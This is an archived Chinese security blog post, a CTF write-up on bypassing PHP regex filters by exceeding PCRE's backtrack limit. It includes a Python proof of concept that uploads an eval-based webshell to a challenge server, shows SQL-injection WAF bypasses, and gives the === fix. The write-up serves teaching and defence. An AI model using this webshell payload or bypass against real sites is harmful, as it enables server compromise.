@@ -1,0 +1,816 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                网络安全 &raquo; <a href="use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">PHP利用PCRE回溯次数限制绕过某些安全限制</h1>
+            <div class="details-up">
+  <span class="author">作者: phithon</span>
+  
+  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
+  
+  <span class="date">时间: 2018-11-26 0:33</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">29条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="use-pcre-backtrack-limit-to-bypass-restrict.html">78652人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html">正则表达式</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <p>这次Code-Breaking Puzzles中我出了一道看似很简单的题目<a href="https://code-breaking.com/puzzle/2/">pcrewaf</a>，将其代码简化如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">function</span> <span class="nf">is_php</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>  
+    <span class="k">return</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>  
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_php</span><span class="p">(</span><span class="nv">$input</span><span class="p">))</span> <span class="p">{</span>
+    <span class="c1">// fwrite($f, $input); ...</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>大意是判断一下用户输入的内容有没有PHP代码，如果没有，则写入文件。这种时候，如何绕过<code>is_php()</code>函数来写入webshell呢？</p>
+<p>这道题看似简单，深究其原理，还是值得写一篇文章的。</p>
+<h2 id="0x01"><a class="toclink" href="#0x01">0x01 正则表达式是什么</a></h2>
+<p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p>
+<p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。</p>
+<p>而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p>
+<ul>
+<li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li>
+<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li>
+</ul>
+<p>由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</p>
+<h2 id="0x02"><a class="toclink" href="#0x02">0x02 回溯的过程是怎样的</a></h2>
+<p>所以，我们题目中的正则<code>&lt;\?.*[(`;?&gt;].*</code>，假设匹配的输入是<code>&lt;?php phpinfo();//aaaaa</code>，实际执行流程是这样的：</p>
+<p><a href="../media/attachment/2018/11/26/51bfc7bb-fd9a-402e-971a-a2247b226f3d.png"><img alt="image.png" src="../media/attachment/2018/11/26/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png" /></a></p>
+<p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符<code>[(`;?&gt;]</code>。</p>
+<p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p>
+<p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>&lt;?php phpinfo()</code>，此时，<code>.*</code>匹配的是<code>php phpinfo()</code>，而后面的<code>;</code>则匹配上<code>[(`;?&gt;]</code>，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配<code>;</code>，14步匹配<code>.*</code>，第二个<code>.*</code>匹配到了字符串末尾，最后结束匹配。</p>
+<p>在调试正则表达式的时候，我们可以查看当前回溯的次数：</p>
+<p><a href="../media/attachment/2018/11/26/13ea3435-1e15-432b-b9f2-fa9805f4b00b.png"><img alt="image.png" src="../media/attachment/2018/11/26/13ea3435-1e15-432b-b9f2-fa9805f4b00b.b2c963c22ff8.png" /></a></p>
+<p>这里回溯了8次。</p>
+<h2 id="0x03-phppcrebacktrack_limit"><a class="toclink" href="#0x03-phppcrebacktrack_limit">0x03 PHP的<code>pcre.backtrack_limit</code>限制利用</a></h2>
+<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get('pcre.backtrack_limit'));</code>的方式查看当前环境下的上限：</p>
+<p><a href="../media/attachment/2018/11/26/f51c0775-1137-44bf-a366-f68b96e5358a.png"><img alt="image.png" src="../media/attachment/2018/11/26/f51c0775-1137-44bf-a366-f68b96e5358a.5d0b63e155b7.png" /></a></p>
+<blockquote>
+<p>这里有个有趣的事情，就是PHP文档中，中英文版本的数值是不一样的：</p>
+<p><a href="../media/attachment/2018/11/26/e1ef3f44-8ea8-4156-94f4-f860e47e9152.png"><img alt="image.png" src="../media/attachment/2018/11/26/e1ef3f44-8ea8-4156-94f4-f860e47e9152.d62407cb720d.png" /></a></p>
+<p>我们应该以英文版为参考。</p>
+</blockquote>
+<p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：</p>
+<p><a href="../media/attachment/2018/11/26/ad1ed05b-fab4-4316-96e0-06717ae7b444.png"><img alt="image.png" src="../media/attachment/2018/11/26/ad1ed05b-fab4-4316-96e0-06717ae7b444.829619d9800d.png" /></a></p>
+<p>可见，<code>preg_match</code>返回的非1和0，而是false。</p>
+<p><code>preg_match</code>函数返回false表示此次执行失败了，我们可以调用<code>var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);</code>，发现失败的原因的确是回溯次数超出了限制：</p>
+<p><a href="../media/attachment/2018/11/26/e9effb6d-fd43-41aa-9bb8-1aab366649e6.png"><img alt="image.png" src="../media/attachment/2018/11/26/e9effb6d-fd43-41aa-9bb8-1aab366649e6.a11361f8009b.png" /></a></p>
+<p>所以，这道题的答案就呼之欲出了。我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p>
+<p>对应的POC如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
+
+<span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;aaa&lt;?php eval($_POST[txt]);//&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1000000</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://51.158.75.42:8088/index.php&#39;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
+</code></pre></div>
+
+<h2 id="0x04-pcre"><a class="toclink" href="#0x04-pcre">0x04 PCRE另一种错误的用法</a></h2>
+<p>延伸一下，很多基于PHP的WAF，如：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/SELECT.+FROM.+/is&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL Injection&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>均存在上述问题，通过大量回溯可以进行绕过。</p>
+<p>另外，我遇到更常见的一种WAF是：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/UNION.+?SELECT/is&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL Injection&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>这里涉及到了正则表达式的“非贪婪模式”。在NFA中，如果我输入<code>UNION/*aaaaa*/SELECT</code>，这个正则表达式执行流程如下：</p>
+<ul>
+<li><code>.+?</code>匹配到<code>/</code></li>
+<li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>*</code></li>
+<li><code>S</code>匹配<code>*</code>失败，回溯，再由<code>.+?</code>匹配<code>*</code></li>
+<li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>a</code></li>
+<li><code>S</code>匹配<code>a</code>失败，回溯，再由<code>.+?</code>匹配<code>a</code></li>
+<li>...</li>
+</ul>
+<p>回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出<code>pcre.backtrack_limit</code>限制，进而绕过WAF：</p>
+<p><a href="../media/attachment/2018/11/26/abf469d4-eb83-416e-8cb3-caa5d59ffb6f.png"><img alt="image.png" src="../media/attachment/2018/11/26/abf469d4-eb83-416e-8cb3-caa5d59ffb6f.b6586a5d1f9b.png" /></a></p>
+<h2 id="0x05"><a class="toclink" href="#0x05">0x05 修复方法</a></h2>
+<p>那么，如何修复这个问题呢？</p>
+<p>其实如果我们仔细观察PHP文档，是可以看到<code>preg_match</code>函数下面的警告的：</p>
+<p><a href="../media/attachment/2018/11/26/cfb5dda3-0643-45b0-9080-81c4a45cda56.png"><img alt="image.png" src="../media/attachment/2018/11/26/cfb5dda3-0643-45b0-9080-81c4a45cda56.d56b2d701229.png" /></a></p>
+<p>如果用<code>preg_match</code>对字符串进行匹配，一定要使用<code>===</code>全等号来判断返回值，如：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">function</span> <span class="nf">is_php</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>  
+    <span class="k">return</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>  
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">is_php</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// fwrite($f, $input); ...</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>这样，即使正则执行失败返回false，也不会进入if语句。</p>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html">正则表达式</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 29 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-3935">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">hms</a></div>
+                    <p>获益匪浅,第一次理解了正则匹配的原理</p>
+                    <span class="comment-time">时间: 2022-07-30 02:26</span>
+                    <span class="comment-reply"><a href="#comment-3935" onclick="reply_to('3935','hms')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3908">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">aaa</a></div>
+                    <p>真的牛，收益匪浅！</p>
+                    <span class="comment-time">时间: 2022-07-07 05:43</span>
+                    <span class="comment-reply"><a href="#comment-3908" onclick="reply_to('3908','aaa')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3411">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/26aea68a080658328b5be102b4c9ff59.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">bigbigliang</a></div>
+                    <p>请问一下，NFA回溯这个时间复杂度是多少啊。</p>
+                    <span class="comment-time">时间: 2019-09-20 23:09</span>
+                    <span class="comment-reply"><a href="#comment-3411" onclick="reply_to('3411','bigbigliang')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3405">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">hello</a></div>
+                    <p>想问一下，&lt;?php<br>if(preg_match(&#x27;/SELECT.+FROM.+/is&#x27;, $input)) {<br>    die(&#x27;SQL Injection&#x27;);<br>}这一个如何进行回溯呢？试了好几下都没有成功。</p>
+                    <span class="comment-time">时间: 2019-09-10 22:50</span>
+                    <span class="comment-reply"><a href="#comment-3405" onclick="reply_to('3405','hello')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3406">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@hello 文章写得很清楚，自行理解吧。</p>
+                    <span class="comment-time">时间: 2019-09-11 00:37</span>
+                    <span class="comment-reply"><a href="#comment-3406" onclick="reply_to('3406','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3408">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">hello</a></div>
+                    <p>@phithon 原来是php版本的问题 ，我服了，在php  7.3.2 中是返回int(1)的 。</p>
+                    <span class="comment-time">时间: 2019-09-11 23:40</span>
+                    <span class="comment-reply"><a href="#comment-3408" onclick="reply_to('3408','hello')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3330">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">hardrain</a></div>
+                    <p>请指教下，这是否也算PHP的弱类型及类型转换带来的问题呢？<br><br>即<br>var_dump(FALSE == 0);<br>// (bool)true<br>var_dump(FALSE === 0);<br>// (bool)false</p>
+                    <span class="comment-time">时间: 2019-04-13 15:14</span>
+                    <span class="comment-reply"><a href="#comment-3330" onclick="reply_to('3330','hardrain')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3312">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">哈哈</a></div>
+                    <p>大牛，你好！</p>
+                    <span class="comment-time">时间: 2019-03-27 20:30</span>
+                    <span class="comment-reply"><a href="#comment-3312" onclick="reply_to('3312','哈哈')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3308">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/42c40e3e677d051d7079b2a1f08807b2.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.qbyue.com" target="_blank" rel="nofollow noopener">丘八阅读网</a></div>
+                    <p>文章不错,非常喜欢</p>
+                    <span class="comment-time">时间: 2019-03-19 14:29</span>
+                    <span class="comment-reply"><a href="#comment-3308" onclick="reply_to('3308','丘八阅读网')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3303">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">故事还长</a></div>
+                    <p>你好 请指教下，这个在实际场景中只能在上传地方用吗？因为post是没办法发送这么大数据的吧</p>
+                    <span class="comment-time">时间: 2019-03-14 11:32</span>
+                    <span class="comment-reply"><a href="#comment-3303" onclick="reply_to('3303','故事还长')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3304">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">故事还长</a></div>
+                    <p>@故事还长 <br>不好意思 没怎么思考就瞎问了<br>已经实验成功，感觉分享</p>
+                    <span class="comment-time">时间: 2019-03-14 15:01</span>
+                    <span class="comment-reply"><a href="#comment-3304" onclick="reply_to('3304','故事还长')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3300">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">ser‘s gf</a></div>
+                    <p>……我换了个模块 扑面而来的杀马特风顿时让我心里大黑客的帅气形象 分崩离析……</p>
+                    <span class="comment-time">时间: 2019-03-12 21:03</span>
+                    <span class="comment-reply"><a href="#comment-3300" onclick="reply_to('3300','ser‘s gf')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3292">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/b686b7613f880570fa9288ac173255fe.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://adoncn.com/30992/" target="_blank" rel="nofollow noopener">免费SSR节点</a></div>
+                    <p>谢谢分享！</p>
+                    <span class="comment-time">时间: 2019-02-10 21:32</span>
+                    <span class="comment-reply"><a href="#comment-3292" onclick="reply_to('3292','免费SSR节点')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3291">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">轻熟男</a></div>
+                    <p>给大佬倒好几杯水了~</p>
+                    <span class="comment-time">时间: 2019-01-31 16:57</span>
+                    <span class="comment-reply"><a href="#comment-3291" onclick="reply_to('3291','轻熟男')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3284">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">华子春xys</a></div>
+                    <p>好厉害，进来学习。</p>
+                    <span class="comment-time">时间: 2019-01-28 17:08</span>
+                    <span class="comment-reply"><a href="#comment-3284" onclick="reply_to('3284','华子春xys')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3253">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">面对疾风吧</a></div>
+                    <p>膜拜大佬</p>
+                    <span class="comment-time">时间: 2018-12-24 15:06</span>
+                    <span class="comment-reply"><a href="#comment-3253" onclick="reply_to('3253','面对疾风吧')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3251">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">谢谢</a></div>
+                    <p>公众号为什么不更新了？</p>
+                    <span class="comment-time">时间: 2018-12-20 19:34</span>
+                    <span class="comment-reply"><a href="#comment-3251" onclick="reply_to('3251','谢谢')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3252">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@谢谢 有心无力，以后的文章都会发在博客，交流可以去知识星球里。</p>
+                    <span class="comment-time">时间: 2018-12-20 22:51</span>
+                    <span class="comment-reply"><a href="#comment-3252" onclick="reply_to('3252','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3248">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">啊哈</a></div>
+                    <p>p神，你博客评论的验证码，真的是一言难尽。可能我需要换眼镜了</p>
+                    <span class="comment-time">时间: 2018-12-06 21:06</span>
+                    <span class="comment-reply"><a href="#comment-3248" onclick="reply_to('3248','啊哈')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+<div class="type-post" id="pagination"><ol class="page-navigator">
+    
+</ol></div>
+
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="63b205e2c3a2f5d108da1deb425eb2a46a2221a5" />
+</div><div class="col-6">
+<img src="../captcha/image/63b205e2c3a2f5d108da1deb425eb2a46a2221a5/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="440" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="c2H7qLyL6naf6hRsIPfZ8DCtXc3YTHjRYA5YYQ9uuJoYEPFQKQcK56Fyizk9sjv9">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
